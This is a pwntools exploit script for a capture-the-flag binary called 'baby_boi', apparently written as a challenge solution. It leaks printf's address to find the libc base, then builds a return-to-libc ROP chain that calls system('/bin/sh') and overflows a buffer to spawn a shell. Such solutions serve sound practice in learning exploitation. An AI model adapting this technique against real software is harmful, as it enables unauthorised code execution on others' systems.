from pwn import *

# patch w/ pwninit, otherwise binary will use system libc
context.binary = './baby_boi_patched'
libc = ELF('./libc-2.27.so')
io = process('./baby_boi_patched')


io.recvuntil(b'Here I am: ')
printf_addr = int(io.recvline(keepends=False)[2:], 16)
libc.address = printf_addr - libc.symbols['printf']
log.info(f"Found libc offset: 0x{libc.address:0x}")
log.info(f"Found system() addr: 0x{libc.symbols['system']:0x}")

log.info("Generating ROP payload...")
rop = ROP([ELF('./baby_boi_patched'), libc])
rop.raw(0x000000000040054e) # fix stack alignment: ret
rop.call('system', [next(libc.search(b'/bin/sh'))])
log.info(f"ROP Payload:\n{rop.dump()}")

payload = flat({
    cyclic_find(0x6161616b) : rop.chain()
})
io.sendline(payload)
log.success("Got Shell!")
io.interactive()
